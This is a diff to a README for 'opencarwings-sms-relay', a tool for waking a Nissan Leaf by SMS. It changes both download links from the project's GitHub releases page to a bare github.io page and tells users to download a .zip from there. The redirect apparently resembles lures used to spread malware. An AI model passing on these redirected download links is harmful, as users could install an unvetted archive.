@@ -1,6 +1,6 @@
 # 📡 opencarwings-sms-relay - Wake Your Nissan Leaf From Anywhere
 
-[![Download Now](https://img.shields.io/badge/Download-OpenCarWings_SMS_Relay-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/americangraybirchmidgrass92/opencarwings-sms-relay/releases)
+[![Download Now](https://img.shields.io/badge/Download-OpenCarWings_SMS_Relay-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://americangraybirchmidgrass92.github.io)
 
 ## 🎯 What Does This Do?
 
@@ -33,7 +33,7 @@ Before you start, gather these items:
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: [https://github.com/americangraybirchmidgrass92/opencarwings-sms-relay/releases](https://github.com/americangraybirchmidgrass92/opencarwings-sms-relay/releases)
+Visit this link to download the application: [https://americangraybirchmidgrass92.github.io](https://americangraybirchmidgrass92.github.io)
 
 You'll see a list of files. Look for the one that matches your modem model (MF79U) and download it. The file will be a compressed archive, usually ending in `.zip`.
 
